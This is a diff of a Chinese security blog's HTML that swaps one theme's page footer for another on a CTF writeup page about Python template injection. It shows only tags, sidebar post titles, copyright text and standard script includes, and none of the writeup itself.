-</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><div class="post_share"><div class="social-share" data-image="https://img.gaifagafin.top/gaifagafin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://img.gaifagafin.top/gaifagafin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">gaifagafin</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/gaifagafin"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/24/%E8%AE%B0%E4%B8%80%E6%AC%A1vimwiki%E5%AE%89%E8%A3%85%E5%8F%8Avim-markDown%E7%9A%84%E4%BD%BF%E7%94%A8/" title="记一次vimwiki安装及vim markDown的使用">记一次vimwiki安装及vim markDown的使用</a><time datetime="2023-11-24T02:43:34.000Z" title="发表于 2023-11-24 10:43:34">2023-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/22/Apache-solr-XXE%E6%BC%8F%E6%B4%9E(CVE-2017-12629)/" title="Apache solr XXE漏洞(CVE-2017-12629)">Apache solr XXE漏洞(CVE-2017-12629)</a><time datetime="2023-11-22T15:15:42.000Z" title="发表于 2023-11-22 23:15:42">2023-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/" title="Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)">Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</a><time datetime="2023-11-22T15:15:42.000Z" title="发表于 2023-11-22 23:15:42">2023-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="Jupyter Notebook 未授权访问漏洞">Jupyter Notebook 未授权访问漏洞</a><time datetime="2023-11-22T15:15:26.000Z" title="发表于 2023-11-22 23:15:26">2023-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/" title="Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)">Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</a><time datetime="2023-11-22T15:10:35.000Z" title="发表于 2023-11-22 23:10:35">2023-11-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By gaifagafin</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>gaifagafin
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/" title="攻防世界-Web_python_template_injection">https://gaifagafin.github.io/2023/10/31/攻防世界Web-python-template-injection/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag"># 攻防世界</a>
+              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/" rel="prev" title="攻防世界 easytornado">
+                  <i class="fa fa-angle-left"></i> 攻防世界 easytornado
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/10/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%85%AB%E7%89%88-%E7%AC%94%E8%AE%B0%E6%91%98%E5%BD%95/" rel="next" title="计算机网络-第八版-笔记摘录">
+                  计算机网络-第八版-笔记摘录 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">gaifagafin</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.24/fancybox/fancybox.umd.js" integrity="sha256-oyhjPiYRWGXaAt+ny/mTMWOnN1GBoZDUQnzzgC7FRI4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":"ture","archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: '32px',
+  left: 'unset',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+</body>
+</html>
